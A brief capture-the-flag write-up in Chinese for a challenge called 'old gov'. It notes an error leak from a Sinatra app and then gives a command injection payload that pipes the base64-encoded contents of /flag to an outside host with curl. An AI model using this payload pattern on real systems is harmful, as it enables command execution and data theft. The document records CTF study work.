# old gov

- 塞id[]=1之類的會噴error
    - sinatra error可以看到部分source code
    - 可以發現它會對id=18做處理
    - id=18是一個可以送URL的輸入框

- 測一下可以發Command Injection漏洞
    - Payload: `site=|curl kaibro.tw/$(cat /flag|base64);`

